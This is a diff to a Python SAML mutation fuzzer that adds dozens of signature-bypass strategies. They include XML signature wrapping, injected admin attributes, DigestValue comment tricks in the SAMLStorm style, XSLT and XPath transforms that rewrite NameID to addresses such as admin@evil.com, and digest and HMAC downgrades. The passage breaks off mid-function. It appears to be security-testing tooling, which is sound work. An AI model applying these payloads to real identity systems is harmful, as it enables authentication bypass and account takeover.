+        sentinel = getattr(self, "_current_sentinel", None)
         a_span = _find_element_span(
             data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE
         )
@@ -936,7 +1334,7 @@ class SamlMutator:
         if not a_span or not s_span:
             return None
         original = bytes(data[a_span[0] : a_span[1]])
-        evil = _make_evil_assertion(self.rng)
+        evil = _make_evil_assertion(self.rng, sentinel)
         obj_block = XSW_OBJECT_PREFIX + original + XSW_OBJECT_SUFFIX
         # Insert Object into Signature (before </ds:Signature>)
         m_sigclose = _RE_SIGNATURE_CLOSE.search(data)
@@ -953,12 +1351,13 @@ class SamlMutator:
 
     def _xsw_envelope_inversion(self, data: bytearray) -> bytearray | None:
         """Envelope inversion: wrap original Response inside a forged outer."""
+        sentinel = getattr(self, "_current_sentinel", None)
         r_span = _find_element_span(
             data, _RE_RESPONSE_OPEN, _RE_RESPONSE_CLOSE
         )
         if not r_span:
             return None
-        evil = _make_evil_assertion(self.rng)
+        evil = _make_evil_assertion(self.rng, sentinel)
         original = bytes(data[r_span[0] : r_span[1]])
         outer = (
             b'<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
@@ -1480,20 +1879,16 @@ class SamlMutator:
         raw = bytes(data)
         if b"saml:" not in raw:
             return None
-        # Replace saml: with saml2: everywhere (but not samlp:)
-        result = raw.replace(b"saml:", b"saml2:")
-        # Fix saml2p: back to samlp: (we accidentally changed samlp:)
-        result = result.replace(b"saml2p:", b"samlp:")
-        # Update namespace declaration
-        result = result.replace(
-            b'xmlns:saml2="',
-            b'xmlns:saml2="',
-        )
-        # Ensure the namespace URI is correct for the new prefix
+        # Step 1: Rename xmlns:saml= declaration to xmlns:saml2=
+        result = raw.replace(b'xmlns:saml="', b'xmlns:saml2="')
+        # Step 2: Replace saml: prefix in element tags to saml2:
+        result = result.replace(b"<saml:", b"<saml2:")
+        result = result.replace(b"</saml:", b"</saml2:")
+        # Step 3: Fix any saml2p: back to samlp: (in case xmlns:samlp was affected)
+        result = result.replace(b"xmlns:saml2p=", b"xmlns:samlp=")
+        # Fallback: if no xmlns:saml2= exists, add it on the first saml2: element
         if b'xmlns:saml2=' not in result:
-            m = _RE_ASSERTION_OPEN.search(result)
-            if not m:
-                m = re.search(rb"<saml2:Assertion\b[^>]*>", result, re.IGNORECASE | re.DOTALL)
+            m = re.search(rb"<saml2:\w+\b[^>]*>", result, re.IGNORECASE | re.DOTALL)
             if m:
                 pos = m.end() - 1
                 ns_decl = b' xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"'
@@ -1634,8 +2029,18 @@ class SamlMutator:
             cm = _RE_C14N_METHOD.search(content)
             if not cm:
                 return None
-            dup = content[cm.start():cm.end() + 3]  # include />
-            new_content = content[:cm.end() + 3] + b"\n" + dup + content[cm.end() + 3:]
+            # Regex ends at closing " — find the /> or > that closes the element
+            rest = content[cm.end():]
+            close = rest.find(b"/>")
+            if close < 0:
+                close = rest.find(b">")
+                if close < 0:
+                    return None
+                elem_end = cm.end() + close + 1
+            else:
+                elem_end = cm.end() + close + 2
+            dup = content[cm.start():elem_end]
+            new_content = content[:elem_end] + b"\n" + dup + content[elem_end:]
         elif technique == "extra_elem":
             new_content = content + b'<ds:Evil xmlns:ds="http://www.w3.org/2000/09/xmldsig#"/>'
         else:
@@ -2353,3 +2758,1283 @@ class SamlMutator:
                 + XSW_EXTENSIONS_SUFFIX
                 + bytes(data[assertion_span[1]:])
             )
+
+    # ══════════════════════════════════════════════════════════════
+    # J: Breakthrough Consensus Strategies
+    # ══════════════════════════════════════════════════════════════
+
+    def _sibling_attribute_inject(self, data: bytearray) -> bytearray | None:
+        """Inject unsigned AttributeStatement as sibling before </samlp:Response>.
+
+        The injected attributes (e.g., role=admin) sit outside the signed
+        Assertion.  SPs that extract attributes via //AttributeValue XPath
+        on the full document (not scoped to the signed Assertion) will pick
+        up the attacker-controlled values.
+        """
+        m = _RE_RESPONSE_CLOSE.search(data)
+        if not m:
+            return None
+        attr_name = self.rng.choice([b"role", b"isAdmin", b"groups", b"memberOf"])
+        attr_val = self.rng.choice([b"admin", b"superadmin", b"root", b"true"])
+        inject = (
+            b'<saml:AttributeStatement xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+            b'<saml:Attribute Name="' + attr_name + b'">'
+            b"<saml:AttributeValue>" + attr_val + b"</saml:AttributeValue>"
+            b"</saml:Attribute>"
+            b"</saml:AttributeStatement>\n"
+        )
+        pos = m.start()
+        return bytearray(bytes(data[:pos]) + inject + bytes(data[pos:]))
+
+    def _saml11_namespace_downgrade(self, data: bytearray) -> bytearray | None:
+        """Replace SAML 2.0 assertion namespace with SAML 1.1.
+
+        Some libraries fall back to SAML 1.x processing which has fewer
+        security checks (no AudienceRestriction enforcement, looser
+        signature scoping).
+        """
+        saml20 = b"urn:oasis:names:tc:SAML:2.0:assertion"
+        saml11 = b"urn:oasis:names:tc:SAML:1.1:assertion"
+        if saml20 not in bytes(data):
+            return None
+        result = bytearray(bytes(data).replace(saml20, saml11, 1))
+        return result if result != data else None
+
+    def _signature_relocation_to_response(self, data: bytearray) -> bytearray | None:
+        """Move Signature from inside Assertion to Response level.
+
+        Exploits CVE-2024-8698 class: libraries that verify the Response-level
+        Signature but extract identity from the (now unsigned) Assertion.
+        The Signature still references the Assertion by URI, but its DOM
+        position changes — some libraries scope verification to the
+        Signature's parent element.
+        """
+        # Find Signature inside Assertion
+        a_span = _find_element_span(data, _RE_ASSERTION_OPEN, _RE_ASSERTION_CLOSE)
+        if not a_span:
+            return None
+        assertion_bytes = bytes(data[a_span[0]:a_span[1]])
+        sig_span = _find_element_span(
+            bytearray(assertion_bytes), _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE
+        )
+        if not sig_span:
+            return None
+        sig_bytes = assertion_bytes[sig_span[0]:sig_span[1]]
+        # Remove Signature from Assertion
+        stripped_assertion = assertion_bytes[:sig_span[0]] + assertion_bytes[sig_span[1]:]
+        # Insert Signature before </samlp:Response>
+        resp_close = _RE_RESPONSE_CLOSE.search(data)
+        if not resp_close:
+            return None
+        result = bytearray(
+            bytes(data[:a_span[0]])
+            + stripped_assertion
+            + bytes(data[a_span[1]:resp_close.start()])
+            + sig_bytes + b"\n"
+            + bytes(data[resp_close.start():])
+        )
+        return result
+
+    # ══════════════════════════════════════════════════════════════
+    # K: SAMLStorm Variant Strategies (65-69)
+    #    Target DigestValue/SignatureValue text-node parsing quirks.
+    # ══════════════════════════════════════════════════════════════
+
+    def _digestvalue_leading_comment(self, data: bytearray) -> bytearray | None:
+        """SAMLStorm firstChild bypass — leading comment in DigestValue.
+
+        Puts an XML comment as the first child of <ds:DigestValue>.
+        Libraries using firstChild.data read the comment instead of the
+        actual digest, causing signature verification to use a wrong value.
+        Unlike strategy 19 (which prepends a comment before the existing
+        text), this variant uses a realistic-looking base64 comment body.
+        """
+        m = _RE_DIGEST_VALUE.search(data)
+        if not m:
+            return None
+        # Choose comment body: looks like valid base64 to confuse parsers
+        comment_body = self.rng.choice([
+            b"<!-- " + m.group(2).strip() + b" -->",
+            b"<!--" + m.group(2).strip() + b"-->",
+            b"<!-- AAAA -->",
+            b"<!---->",
+        ])
+        # Replace entire DigestValue content with comment + real value
+        new_content = comment_body + m.group(2)
+        return bytearray(
+            bytes(data[:m.start(2)]) + new_content + bytes(data[m.end(2):])
+        )
+
+    def _digestvalue_cdata_wrap(self, data: bytearray) -> bytearray | None:
+        """Wrap DigestValue content in CDATA section.
+
+        Some XML parsers normalize CDATA to text nodes, others don't.
+        If a library doesn't handle CDATA in DigestValue, it may read
+        an empty text node or fail to extract the digest.
+        """
+        m = _RE_DIGEST_VALUE.search(data)
+        if not m:
+            return None
+        real_value = m.group(2).strip()
+        cdata_wrapped = b"<![CDATA[" + real_value + b"]]>"
+        return bytearray(
+            bytes(data[:m.start(2)]) + cdata_wrapped + bytes(data[m.end(2):])
+        )
+
+    def _digestvalue_split_comment(self, data: bytearray) -> bytearray | None:
+        """Split DigestValue text node with an internal comment.
+
+        <ds:DigestValue>RE<!---->AL</ds:DigestValue>
+        Libraries that concatenate all text children see "REAL",
+        but those using firstChild.data only see "RE".
+        """
+        m = _RE_DIGEST_VALUE.search(data)
+        if not m:
+            return None
+        real_value = m.group(2).strip()
+        if len(real_value) < 4:
+            return None
+        # Split at a random position (but at least 2 chars from each end)
+        split_pos = self.rng.randint(2, len(real_value) - 2)
+        comment = self.rng.choice([b"<!---->", b"<!-- -->", b"<!--x-->"])
+        split_value = real_value[:split_pos] + comment + real_value[split_pos:]
+        return bytearray(
+            bytes(data[:m.start(2)]) + split_value + bytes(data[m.end(2):])
+        )
+
+    def _sigvalue_multi_comment(self, data: bytearray) -> bytearray | None:
+        """Inject comments into SignatureValue (multiple variants).
+
+        Extends CVE-2025-29774 with additional comment placement patterns:
+        leading, trailing, and split-text variants in SignatureValue.
+        """
+        m = _RE_SIGNATURE_VALUE.search(data)
+        if not m:
+            return None
+        real_value = m.group(2).strip()
+        variant = self.rng.randint(0, 3)
+        if variant == 0:
+            # Leading comment (firstChild bypass)
+            new_val = b"<!-- " + real_value[:8] + b" -->" + real_value
+        elif variant == 1:
+            # Trailing comment
+            new_val = real_value + b"<!---->"
+        elif variant == 2:
+            # CDATA wrap
+            new_val = b"<![CDATA[" + real_value + b"]]>"
+        else:
+            # Split with comment
+            if len(real_value) < 8:
+                new_val = b"<!---->" + real_value
+            else:
+                sp = self.rng.randint(4, len(real_value) - 4)
+                new_val = real_value[:sp] + b"<!---->" + real_value[sp:]
+        return bytearray(
+            bytes(data[:m.start(2)]) + new_val + bytes(data[m.end(2):])
+        )
+
+    def _digestvalue_pi_inject(self, data: bytearray) -> bytearray | None:
+        """Inject processing instruction into DigestValue.
+
+        <ds:DigestValue><?x?>REAL</ds:DigestValue>
+        PIs are a less-tested variant of the firstChild attack vector.
+        Some parsers skip PIs when reading text, others don't.
+        """
+        m = _RE_DIGEST_VALUE.search(data)
+        if not m:
+            return None
+        pi = self.rng.choice([
+            b"<?x?>",
+            b"<?xml-digest ?>",
+            b"<?pi ?>",
+            b"<?x " + m.group(2).strip()[:8] + b"?>",
+        ])
+        return bytearray(
+            bytes(data[:m.start(2)]) + pi + bytes(data[m.start(2):])
+        )
+
+    # ══════════════════════════════════════════════════════════════
+    # L: C14N Edge Case Strategies (70-74)
+    #    Exploit canonicalization divergences between libraries.
+    # ══════════════════════════════════════════════════════════════
+
+    def _c14n_superfluous_ns(self, data: bytearray) -> bytearray | None:
+        """Add unused namespace declarations inside Assertion.
+
+        Exc-c14n should exclude unreferenced namespace declarations, but
+        implementations differ in handling. Some include them in the
+        canonical form, others don't, leading to different digests.
+        """
+        m = _RE_ASSERTION_OPEN.search(data)
+        if not m:
+            return None
+        ns_decls = self.rng.choice([
+            b' xmlns:unused="http://example.com/unused"',
+            b' xmlns:foo="http://foo.bar/ns" xmlns:baz="http://baz.qux/ns"',
+            b' xmlns:xenc="http://www.w3.org/2001/04/xmlenc#"',
+            b' xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#"',
+        ])
+        pos = m.end() - 1  # Before the closing >
+        return bytearray(
+            bytes(data[:pos]) + ns_decls + bytes(data[pos:])
+        )
+
+    def _c14n_inherited_ns(self, data: bytearray) -> bytearray | None:
+        """Add namespace declaration on Response, reference inside Assertion.
+
+        Tests whether c14n correctly handles namespace inheritance when
+        the namespace is declared on an ancestor but used in a descendant.
+        Exc-c14n should include visibly-utilized namespaces from ancestors.
+        """
+        # Add xmlns:custom on Response
+        m_resp = _RE_RESPONSE_OPEN.search(data)
+        if not m_resp:
+            return None
+        ns_uri = self.rng.choice([
+            b"http://custom.example.com/v1",
+            b"urn:custom:test:namespace",
+            b"http://www.w3.org/1999/xhtml",
+        ])
+        ns_decl = b' xmlns:custom="' + ns_uri + b'"'
+        pos = m_resp.end() - 1
+        result = bytearray(
+            bytes(data[:pos]) + ns_decl + bytes(data[pos:])
+        )
+        # Add custom:attr="test" on an element inside Assertion
+        m_nameid = _RE_NAMEID.search(result)
+        if m_nameid:
+            inject_pos = m_nameid.start(1) + len(b"<saml:NameID")
+            # Find the end of the opening tag attributes
+            tag_end = result.index(b">", inject_pos)
+            result = bytearray(
+                bytes(result[:tag_end]) + b' custom:attr="test"' + bytes(result[tag_end:])
+            )
+        return result
+
+    def _c14n_attr_value_normalization(self, data: bytearray) -> bytearray | None:
+        """Inject character references (&#13; &#10; &#9;) in attribute values.
+
+        C14N requires attribute value normalization: &#xD;→&#xD;, &#xA;→&#xA;,
+        &#x9;→&#x9; in output. Libraries that normalize differently produce
+        different canonical forms.
+        """
+        m = _RE_ASSERTION_OPEN.search(data)
+        if not m:
+            return None
+        # Find an attribute value inside the Assertion opening tag
+        tag_text = bytes(data[m.start():m.end()])
+        # Inject into Assertion ID attribute value
+        id_match = re.search(rb'(ID=")(.*?)(")', tag_text)
+        if not id_match:
+            return None
+        char_ref = self.rng.choice([b"&#13;", b"&#10;", b"&#9;", b"&#xD;", b"&#xA;"])
+        old_id = id_match.group(2)
+        new_id = old_id + char_ref
+        result = bytearray(data)
+        # Replace in the assertion opening tag
+        abs_start = m.start() + id_match.start(2)
+        abs_end = m.start() + id_match.end(2)
+        result[abs_start:abs_end] = new_id
+        return result
+
+    def _c14n_default_vs_prefixed_ns(self, data: bytearray) -> bytearray | None:
+        """Swap prefixed namespace to default namespace on Assertion.
+
+        <saml:Assertion xmlns:saml="..."> → <Assertion xmlns="...">
+        Exc-c14n treats default and prefixed namespaces differently.
+        This can cause digest mismatches across libraries.
+        """
+        saml_ns = b"urn:oasis:names:tc:SAML:2.0:assertion"
+        m = _RE_ASSERTION_OPEN.search(data)
+        if not m:
+            return None
+        tag = bytes(data[m.start():m.end()])
+        # Check it uses saml: prefix
+        if not tag.startswith(b"<saml:Assertion"):
+            return None
+        # Replace <saml:Assertion xmlns:saml="NS" to <Assertion xmlns="NS"
+        new_tag = tag.replace(b"<saml:Assertion", b"<Assertion", 1)
+        new_tag = new_tag.replace(b'xmlns:saml="' + saml_ns + b'"',
+                                   b'xmlns="' + saml_ns + b'"', 1)
+        result = bytearray(
+            bytes(data[:m.start()]) + new_tag + bytes(data[m.end():])
+        )
+        # Also replace closing tag
+        result = bytearray(bytes(result).replace(b"</saml:Assertion>", b"</Assertion>", 1))
+        # Replace saml: prefix on child elements within first assertion
+        for child_tag in [b"saml:Issuer", b"saml:Subject", b"saml:Conditions",
+                          b"saml:AuthnStatement", b"saml:NameID"]:
+            unprefixed = child_tag.replace(b"saml:", b"", 1)
+            result = bytearray(bytes(result).replace(
+                b"<" + child_tag, b"<" + unprefixed, 1
+            ))
+            result = bytearray(bytes(result).replace(
+                b"</" + child_tag + b">", b"</" + unprefixed + b">", 1
+            ))
+        return result
+
+    def _c14n_xml_inherited_attrs(self, data: bytearray) -> bytearray | None:
+        """Inject xml:lang or xml:space on ancestor element.
+
+        In exc-c14n, xml: attributes are inherited and must be reproduced
+        in canonical form. Libraries differ on whether inherited xml:
+        attributes from ancestors outside the signed subset are included.
+        """
+        m_resp = _RE_RESPONSE_OPEN.search(data)
+        if not m_resp:
+            return None
+        xml_attr = self.rng.choice([
+            b' xml:lang="en"',
+            b' xml:space="preserve"',
+            b' xml:lang="de"',
+            b' xml:base="http://example.com/"',
+        ])
+        pos = m_resp.end() - 1
+        return bytearray(
+            bytes(data[:pos]) + xml_attr + bytes(data[pos:])
+        )
+
+    # ══════════════════════════════════════════════════════════════
+    # M: Novel Attack Vector (75)
+    # ══════════════════════════════════════════════════════════════
+
+    def _xpath_transform_exclude_subject(self, data: bytearray) -> bytearray | None:
+        """Inject XPath transform that excludes Subject from digest computation.
+
+        Adds an XPath Transform to the Reference's transform chain that
+        evaluates to true for all nodes EXCEPT saml:Subject. If a library
+        applies this transform, the Subject (containing NameID) is excluded
+        from the digest calculation, allowing the attacker to modify NameID
+        freely without invalidating the signature.
+        """
+        m_transforms = _RE_TRANSFORMS.search(data)
+        if not m_transforms:
+            return None
+        # Build XPath transform that excludes Subject
+        xpath_transform = (
+            b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xpath-19991116">'
+            b'<ds:XPath xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+            b'not(ancestor-or-self::saml:Subject)'
+            b'</ds:XPath>'
+            b'</ds:Transform>'
+        )
+        # Insert XPath transform BEFORE the existing transforms
+        insert_pos = m_transforms.start(2)
+        result = bytearray(
+            bytes(data[:insert_pos]) + xpath_transform + bytes(data[insert_pos:])
+        )
+        # Now modify NameID to attacker value since it should be excluded from digest
+        m_nameid = _RE_NAMEID.search(result)
+        if m_nameid:
+            evil_email = self.rng.choice([
+                b"admin@evil.com",
+                b"root@attacker.com",
+                b"superadmin@evil.com",
+            ])
+            result = bytearray(
+                bytes(result[:m_nameid.start(2)])
+                + evil_email
+                + bytes(result[m_nameid.end(2):])
+            )
+        return result
+
+    # ══════════════════════════════════════════════════════════════
+    # N: Gap-derived strategies (76-80)
+    # ══════════════════════════════════════════════════════════════
+
+    def _encrypted_assertion_wrapping(self, data: bytearray) -> bytearray | None:
+        """Wrap legitimate assertion in EncryptedAssertion, inject evil assertion.
+
+        CVE-2024-4985/CVE-2024-9487 class: some libraries extract the first
+        plaintext Assertion and ignore the EncryptedAssertion wrapper, allowing
+        an attacker to prepend an evil assertion before the wrapped one.
+        """
+        m_assertion_open = _RE_ASSERTION_OPEN.search(data)
+        m_assertion_close = _RE_ASSERTION_CLOSE.search(data)
+        if not m_assertion_open or not m_assertion_close:
+            return None
+        assertion_bytes = bytes(data[m_assertion_open.start():m_assertion_close.end()])
+        # Wrap original assertion inside EncryptedAssertion
+        wrapped = (
+            b'<saml:EncryptedAssertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+            + assertion_bytes
+            + b'</saml:EncryptedAssertion>'
+        )
+        # Build evil assertion with attacker NameID
+        evil_email = self.rng.choice([
+            b"admin@evil.com", b"root@attacker.com", b"superadmin@evil.com",
+        ])
+        evil_assertion = (
+            b'<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
+            b' ID="_evil_enc" Version="2.0" IssueInstant="2099-01-01T00:00:00Z">'
+            b'<saml:Issuer>https://evil.idp</saml:Issuer>'
+            b'<saml:Subject><saml:NameID>' + evil_email + b'</saml:NameID></saml:Subject>'
+            b'</saml:Assertion>'
+        )
+        # Replace original assertion with evil + wrapped
+        result = bytearray(
+            bytes(data[:m_assertion_open.start()])
+            + evil_assertion
+            + wrapped
+            + bytes(data[m_assertion_close.end():])
+        )
+        return result
+
+    def _digestmethod_only_downgrade(self, data: bytearray) -> bytearray | None:
+        """Downgrade only DigestMethod to MD5 while keeping SignatureMethod intact.
+
+        Some libraries (e.g. python3-saml) enforce strong SignatureMethod but
+        fail to validate DigestMethod independently, accepting MD5 digests
+        with RSA-SHA256 signatures.
+        """
+        m_digest_method = _RE_DIGEST_METHOD.search(data)
+        if not m_digest_method:
+            return None
+        weak_algos = [
+            b"http://www.w3.org/2001/04/xmldsig#md5",
+            b"http://www.w3.org/2001/04/xmlenc#ripemd160",
+            b"http://www.w3.org/2001/04/xmldsig#sha1",
+        ]
+        chosen = self.rng.choice(weak_algos)
+        # Only replace DigestMethod, leave SignatureMethod untouched
+        result = bytearray(
+            bytes(data[:m_digest_method.start(2)])
+            + chosen
+            + bytes(data[m_digest_method.end(2):])
+        )
+        return result
+
+    def _unicode_identity_confusion(self, data: bytearray) -> bytearray | None:
+        """Inject invisible Unicode characters into NameID to cause identity confusion.
+
+        Different XML parsers handle BOM, ZWSP, ZWNJ, soft-hyphen, and line
+        separators differently in text content. This can cause one library to
+        see 'admin@corp.com' while another sees 'admin\\u200b@corp.com'.
+        """
+        m_nameid = _RE_NAMEID.search(data)
+        if not m_nameid:
+            return None
+        original = m_nameid.group(2)
+        if len(original) < 3:
+            return None
+        # Invisible Unicode chars (UTF-8 encoded)
+        invisible_chars = [
+            b'\xe2\x80\x8b',  # U+200B ZERO WIDTH SPACE
+            b'\xe2\x80\x8c',  # U+200C ZERO WIDTH NON-JOINER
+            b'\xe2\x80\x8d',  # U+200D ZERO WIDTH JOINER
+            b'\xc2\xad',      # U+00AD SOFT HYPHEN
+            b'\xe2\x80\xa8',  # U+2028 LINE SEPARATOR
+            b'\xef\xbb\xbf',  # U+FEFF BOM
+            b'\xe2\x81\xa0',  # U+2060 WORD JOINER
+            b'\xc2\xa0',      # U+00A0 NO-BREAK SPACE
+        ]
+        char = self.rng.choice(invisible_chars)
+        # Insert at random position within the NameID value
+        pos = self.rng.randint(1, len(original) - 1)
+        new_nameid = bytes(original[:pos]) + char + bytes(original[pos:])
+        result = bytearray(
+            bytes(data[:m_nameid.start(2)])
+            + new_nameid
+            + bytes(data[m_nameid.end(2):])
+        )
+        return result
+
+    def _xslt_pre_verification_transform(self, data: bytearray) -> bytearray | None:
+        """Inject XSLT transform that modifies document before signature verification.
+
+        Java's javax.xml.crypto processes XSLT transforms within ds:Reference
+        BEFORE verifying the digest. An attacker can inject an XSLT transform
+        that rewrites assertion content, then the digest is computed on the
+        transformed (attacker-controlled) output.
+        """
+        m_transforms = _RE_TRANSFORMS.search(data)
+        if not m_transforms:
+            return None
+        # XSLT that copies everything but rewrites NameID
+        xslt_transforms = [
+            # Variant 1: Identity transform with NameID override
+            (
+                b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
+                b'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"'
+                b' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
+                b'<xsl:template match="@*|node()"><xsl:copy><xsl:apply-templates'
+                b' select="@*|node()"/></xsl:copy></xsl:template>'
+                b'<xsl:template match="saml:NameID/text()">admin@evil.com</xsl:template>'
+                b'</xsl:stylesheet></ds:Transform>'
+            ),
+            # Variant 2: Strip signature elements to bypass enveloped-sig check
+            (
+                b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
+                b'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"'
+                b' xmlns:ds="http://www.w3.org/2000/09/xmldsig#">'
+                b'<xsl:template match="@*|node()"><xsl:copy><xsl:apply-templates'
+                b' select="@*|node()"/></xsl:copy></xsl:template>'
+                b'<xsl:template match="ds:Signature"/>'
+                b'</xsl:stylesheet></ds:Transform>'
+            ),
+            # Variant 3: EXSLT with system-property probe
+            (
+                b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">'
+                b'<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
+                b'<xsl:template match="/"><xsl:copy-of select="."/></xsl:template>'
+                b'</xsl:stylesheet></ds:Transform>'
+            ),
+        ]
+        xslt = self.rng.choice(xslt_transforms)
+        # Insert XSLT transform at the beginning of the transform chain
+        insert_pos = m_transforms.start(2)
+        result = bytearray(
+            bytes(data[:insert_pos]) + xslt + bytes(data[insert_pos:])
+        )
+        return result
+
+    def _void_c14n_enhanced(self, data: bytearray) -> bytearray | None:
+        """Enhanced void canonicalization with multiple relative namespace URI patterns.
+
+        Extends the basic void c14n attack (strategy 18/53) with additional
+        variants: empty namespace URI, dot-relative URI, fragment-only URI,
+        and scheme-relative URI. These test different c14n implementations'
+        handling of namespace URIs that resolve to empty or near-empty strings.
+        """
+        m_assertion = _RE_ASSERTION_OPEN.search(data)
+        if not m_assertion:
+            return None
+        # Various namespace URI patterns that might cause c14n confusion
+        ns_variants = [
+            b' xmlns:void=""',                         # empty URI
+            b' xmlns:void="."',                        # dot-relative
+            b' xmlns:void="#"',                        # fragment-only
+            b' xmlns:void="//"',                       # scheme-relative empty
+            b' xmlns:void="urn:"',                     # bare urn scheme
+            b' xmlns:void="data:,"',                   # empty data URI
+            b' xmlns:void="\t"',                       # tab char URI
+            b' xmlns:void="http://"',                  # scheme-only
+        ]
+        chosen_ns = self.rng.choice(ns_variants)
+        # Inject the namespace declaration into the Assertion opening tag
+        insert_pos = m_assertion.end() - 1  # before the closing >
+        result = bytearray(
+            bytes(data[:insert_pos])
+            + chosen_ns
+            + bytes(data[insert_pos:])
+        )
+        return result
+
+    # ══════════════════════════════════════════════════════════════
+    # O: XML-DSig spec-derived strategies (81-89)
+    #    Based on xmldsig-core-1 §4.3, §4.4, §5.1
+    # ══════════════════════════════════════════════════════════════
+
+    def _signedinfo_c14n_swap(self, data: bytearray) -> bytearray | None:
+        """Swap SignedInfo CanonicalizationMethod independently from Transform c14n.
+
+        xmldsig-core §4.3.1: CanonicalizationMethod specifies the c14n applied
+        to SignedInfo prior to signature calculation. This is INDEPENDENT of the
+        c14n used in Reference Transforms. Swapping only SignedInfo c14n tests
+        whether libraries compute the SignedInfo hash differently when the
+        algorithm changes (inclusive vs exclusive, with/without comments).
+        """
+        m = _RE_C14N_METHOD.search(data)
+        if not m:
+            return None
+        current = m.group(2)
+        # Choose a DIFFERENT algorithm from what's currently set
+        alternatives = [a for a in C14N_ALGORITHMS if a != current and a]
+        if not alternatives:
+            return None
+        algo = self.rng.choice(alternatives)
+        return bytearray(
+            bytes(data[:m.start(2)]) + algo + bytes(data[m.end(2):])
+        )
+
+    def _transform_remove_c14n(self, data: bytearray) -> bytearray | None:
+        """Remove c14n Transform from Reference, relying on implicit default.
+
+        xmldsig-core §4.3.3.2: When URI yields node-set and next transform
+        requires octets, application MUST convert using Canonical XML. Spec warns
+        applications SHOULD NOT rely on this default. By removing the explicit
+        c14n transform, we test which implicit default each library uses.
+        """
+        m = _RE_C14N_TRANSFORM.search(data)
+        if not m:
+            return None
+        # Find the full transform element (self-closing or with children)
+        # Match from <ds:Transform to /> or </ds:Transform>
+        start = m.start()
+        rest = bytes(data[start:])
+        # Try self-closing first
+        sc = re.match(rb'<ds:Transform\s[^>]*/>', rest, re.IGNORECASE | re.DOTALL)
+        if sc:
+            end = start + sc.end()
+        else:
+            # Open/close form
+            close = re.search(rb'</ds:Transform\s*>', rest, re.IGNORECASE)
+            if not close:
+                return None
+            end = start + close.end()
+        return bytearray(bytes(data[:start]) + bytes(data[end:]))
+
+    def _xpointer_comment_preservation(self, data: bytearray) -> bytearray | None:
+        """Switch Reference URI from shortname to scheme-based XPointer.
+
+        xmldsig-core §4.3.3.3 step 4: Shortname XPointers (#ID) DELETE comment
+        nodes, but scheme-based (#xpointer(id('ID'))) PRESERVE comments. This
+        is the root cause of SAMLStorm (CVE-2025-29775). We combine URI change
+        with comment injection to test the divergence.
+        """
+        m = _RE_REFERENCE_URI.search(data)
+        if not m:
+            return None
+        uri = m.group(2)
+        if not uri or not uri.startswith(b"#"):
+            return None
+        frag = uri[1:]  # strip leading #
+        if b"xpointer" in frag:
+            return None  # already scheme-based
+        # Convert to scheme-based XPointer
+        new_uri = b"#xpointer(id('" + frag + b"'))"
+        result = bytearray(
+            bytes(data[:m.start(2)]) + new_uri + bytes(data[m.end(2):])
+        )
+        # Also inject a comment into DigestValue to exploit comment preservation
+        m_dv = _RE_DIGEST_VALUE.search(result)
+        if m_dv:
+            comment = self.rng.choice(COMMENT_DIGEST_PAYLOADS)
+            result = bytearray(
+                bytes(result[:m_dv.start(2)])
+                + comment + m_dv.group(2)
+                + bytes(result[m_dv.end(2):])
+            )
+        return result
+
+    def _hmac_truncation_attack(self, data: bytearray) -> bytearray | None:
+        """Inject HMACOutputLength to truncate HMAC signature.
+
+        xmldsig-core §4.3.2: MUST reject if truncation < max(half hash, 80 bits).
+        Libraries that don't enforce this allow brute-forcing a 1-bit HMAC.
+        Also swaps SignatureMethod to HMAC to make truncation meaningful.
+        """
+        m_sig = _RE_SIG_METHOD.search(data)
+        if not m_sig:
+            return None
+        # Set HMAC algorithm
+        hmac_algo = b"http://www.w3.org/2001/04/xmldsig-more#hmac-sha256"
+        result = bytearray(
+            bytes(data[:m_sig.start(2)]) + hmac_algo + bytes(data[m_sig.end(2):])
+        )
+        # Insert HMACOutputLength after SignatureMethod close tag
+        sm_close = re.search(rb'(</ds:SignatureMethod>|<ds:SignatureMethod[^/]*/?>)',
+                             result, re.IGNORECASE)
+        if not sm_close:
+            return result
+        truncation = self.rng.choice(HMAC_TRUNCATION_LENGTHS)
+        # If self-closing, convert to open/close and insert param
+        tag_bytes = sm_close.group(0)
+        if tag_bytes.endswith(b"/>"):
+            new_tag = tag_bytes[:-2] + b">" + truncation + b"</ds:SignatureMethod>"
+            result = bytearray(
+                bytes(result[:sm_close.start()])
+                + new_tag
+                + bytes(result[sm_close.end():])
+            )
+        else:
+            # Insert truncation before the close tag
+            insert_pos = sm_close.start()
+            result = bytearray(
+                bytes(result[:insert_pos])
+                + truncation
+                + bytes(result[insert_pos:])
+            )
+        return result
+
+    def _manifest_reference_inject(self, data: bytearray) -> bytearray | None:
+        """Inject Manifest inside ds:Object with Reference to evil Assertion.
+
+        xmldsig-core §2.3/§5.1: Manifest References have same structure as
+        SignedInfo References, but validation is 'under application control'.
+        Some libraries validate them, others ignore. Injecting a Manifest
+        with a Reference to an evil Assertion tests this divergence.
+        """
+        sig_span = _find_element_span(data, _RE_SIGNATURE_OPEN, _RE_SIGNATURE_CLOSE)
+        if not sig_span:
+            return None
+        # Build evil assertion with known ID
+        evil_id = self.rng.randbytes(4).hex().encode()
+        evil_assertion = _make_evil_assertion(self.rng)
+        # Build Manifest referencing the evil assertion
+        manifest_obj = MANIFEST_TEMPLATE.replace(b"{REF_URI}", b"_evil_" + evil_id)
+        # Insert evil assertion before Signature, Manifest after Signature
+        sig_start, sig_end = sig_span
+        result = bytearray(
+            bytes(data[:sig_start])
+            + evil_assertion
+            + bytes(data[sig_start:sig_end])
+            + manifest_obj
